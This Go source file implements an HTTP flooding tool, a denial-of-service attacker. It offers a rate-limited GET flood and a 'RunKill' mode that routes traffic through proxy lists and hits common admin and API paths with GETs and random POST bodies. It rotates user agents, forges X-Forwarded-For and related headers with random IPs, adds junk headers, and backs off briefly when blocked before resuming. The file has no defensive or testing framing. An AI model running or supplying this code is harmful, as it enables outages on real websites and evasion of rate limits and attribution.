package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"
)

type HTTPFlooder struct {
	client  *http.Client
	sent    int64
	errors  int64
	stopFlg int32
}

func NewHTTPFlooder() *HTTPFlooder {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        1000,
		MaxConnsPerHost:     1000,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  false,
	}
	return &HTTPFlooder{
		client: &http.Client{
			Transport: transport,
			Timeout:   10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

func (h *HTTPFlooder) Stop() {
	atomic.StoreInt32(&h.stopFlg, 1)
}

func (h *HTTPFlooder) stopped() bool {
	return atomic.LoadInt32(&h.stopFlg) != 0
}

func httpClientWithProxy(proxyURL string) *http.Client {
	proxyFunc := func(_ *http.Request) (*url.URL, error) {
		return url.Parse(proxyURL)
	}
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           proxyFunc,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        1000,
		MaxConnsPerHost:     1000,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  true,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func (h *HTTPFlooder) Run(target string, port int, workers int, rateLimit int, duration int, proxyList []string, jitter int, status chan<- WorkerStats) {
	var active int32

	scheme := "http"
	if port == 443 {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d/", scheme, target, port)

	perWorker := rateLimit / workers
	if perWorker < 1 {
		perWorker = 1
	}

	for w := 0; w < workers; w++ {
		go h.workerLoop(url, &active, jitter, perWorker, proxyList)
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for elapsed := 0; elapsed < duration; elapsed++ {
		if h.stopped() {
			break
		}
		<-ticker.C
		status <- WorkerStats{
			Sent:   atomic.SwapInt64(&h.sent, 0),
			Errors: atomic.SwapInt64(&h.errors, 0),
			Active: int(atomic.LoadInt32(&active)),
		}
	}
	atomic.StoreInt32(&h.stopFlg, 1)
	h.client.CloseIdleConnections()
}

func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit int, duration int, proxyList []string, jitter int, status chan<- WorkerStats) {
	var active int32

	scheme := "http"
	if port == 443 {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%d", scheme, target, port)

	clientCount := 10
	clients := make([]*http.Client, clientCount)
	for i := range clients {
		if len(proxyList) > 0 {
			proxyURL := proxyList[rand.Intn(len(proxyList))]
			clients[i] = httpClientWithProxy(proxyURL)
		} else {
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				DialContext: (&net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 300 * time.Second,
				}).DialContext,
				MaxIdleConns:        10000,
				MaxConnsPerHost:     10000,
				MaxIdleConnsPerHost: 1000,
				IdleConnTimeout:     300 * time.Second,
				DisableKeepAlives:   false,
				DisableCompression:  true,
			}
			clients[i] = &http.Client{
				Transport: tr,
				Timeout:   120 * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}
		}
	}

	paths := []string{
		"/", "/index.html", "/wp-admin", "/admin", "/login",
		"/api/v1/users", "/api/v2/data", "/search", "/graphql",
		"/.env", "/wp-content/plugins", "/xmlrpc.php",
	}
	postData := make([]byte, 1024*1024)
	rand.Read(postData)

	for w := 0; w < workers; w++ {
		c := clients[w%len(clients)]
		proxyURL := ""
		if len(proxyList) > 0 {
			proxyURL = proxyList[rand.Intn(len(proxyList))]
		}
		go func(client *http.Client, pxy string) {
			atomic.AddInt32(&active, 1)
			defer atomic.AddInt32(&active, -1)
			consecBlocked := 0
			for !h.stopped() {
				if consecBlocked > 3 {
					time.Sleep(3 * time.Second)
					consecBlocked = 0
					continue
				}
				isPost := rand.Intn(3) == 0
				p := paths[rand.Intn(len(paths))]
				url := baseURL + p

				var req *http.Request
				var err error
				if isPost {
					size := 1024 * (1 + rand.Intn(10))
					body := make([]byte, size)
					rand.Read(body)
					req, err = http.NewRequest("POST", url, readerFromBytes(body))
				} else {
					req, err = http.NewRequest("GET", url, nil)
				}
				if err != nil {
					atomic.AddInt64(&h.errors, 1)
					continue
				}
				req.Header.Set("User-Agent", uaList[rand.Intn(len(uaList))])
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Accept-Language", "en-US,en;q=0.9")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Referer", fmt.Sprintf("http://%s/", randHost()))
				req.Header.Set("X-Forwarded-For", randIP())
				req.Header.Set("X-Real-IP", randIP())
				req.Header.Set("Forwarded", fmt.Sprintf("for=%s;proto=http;by=%s", randIP(), randIP()))
				for i := 0; i < rand.Intn(20); i++ {
					req.Header.Set(fmt.Sprintf("X-Rand-%d", i), randStr(64))
				}

				resp, err := client.Do(req)
				if err != nil {
					atomic.AddInt64(&h.errors, 1)
				} else {
					if resp.StatusCode == 403 || resp.StatusCode == 429 || resp.StatusCode == 503 {
						consecBlocked++
					} else {
						consecBlocked = 0
					}
					totalRead := 0
					buf := make([]byte, 4096)
					for {
						n, rerr := resp.Body.Read(buf)
						totalRead += n
						if rerr != nil {
							break
						}
						if totalRead > 8192 {
							break
						}
					}
					resp.Body.Close()
					atomic.AddInt64(&h.sent, 1)
				}
			}
		}(c, proxyURL)
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for elapsed := 0; elapsed < duration; elapsed++ {
		if h.stopped() {
			break
		}
		<-ticker.C
		status <- WorkerStats{
			Sent:   atomic.SwapInt64(&h.sent, 0),
			Errors: atomic.SwapInt64(&h.errors, 0),
			Active: int(atomic.LoadInt32(&active)),
			Rate:   int(rateLimit),
		}
	}
	atomic.StoreInt32(&h.stopFlg, 1)
	for _, c := range clients {
		c.CloseIdleConnections()
	}
}

type byteReader struct{ data []byte }

func readerFromBytes(b []byte) io.Reader { return &byteReader{data: b} }
func (r *byteReader) Read(p []byte) (int, error) {
	n := copy(p, r.data)
	return n, io.EOF
}

var uaList = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.2210.91",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Mobile/15E148",
	"Mozilla/5.0 (Linux; Android 14) Chrome/120.0.6099.43 Mobile",
}

func (h *HTTPFlooder) workerLoop(url string, active *int32, jitter int, ratePerSec int, proxyList []string) {
	atomic.AddInt32(active, 1)
	defer atomic.AddInt32(active, -1)

	var client *http.Client
	if len(proxyList) > 0 {
		proxyURL := proxyList[rand.Intn(len(proxyList))]
		client = httpClientWithProxy(proxyURL)
	} else {
		client = h.client
	}

	interval := time.Second / time.Duration(ratePerSec)
	if interval < time.Microsecond {
		interval = time.Microsecond
	}
	rateTicker := time.NewTicker(interval)
	defer rateTicker.Stop()

	for range rateTicker.C {
		if h.stopped() {
			return
		}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			atomic.AddInt64(&h.errors, 1)
			continue
		}
		req.Header.Set("User-Agent", uaList[rand.Intn(len(uaList))])
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Referer", fmt.Sprintf("http://%s/", randHost()))
		req.Header.Set("X-Forwarded-For", randIP())
		req.Header.Set("X-Real-IP", randIP())

		resp, err := client.Do(req)
		if err != nil {
			atomic.AddInt64(&h.errors, 1)
			if jitter > 0 {
				time.Sleep(time.Duration(jitter) * time.Microsecond)
			}
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddInt64(&h.sent, 1)

		if jitter > 0 {
			time.Sleep(time.Duration(jitter) * time.Microsecond)
		}
	}
}

func randHost() string {
	hosts := []string{
		"google.com", "facebook.com", "youtube.com", "instagram.com",
		"reddit.com", "tiktok.com", "whatsapp.com", "amazon.com",
	}
	return hosts[rand.Intn(len(hosts))]
}

func randIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(255))
}
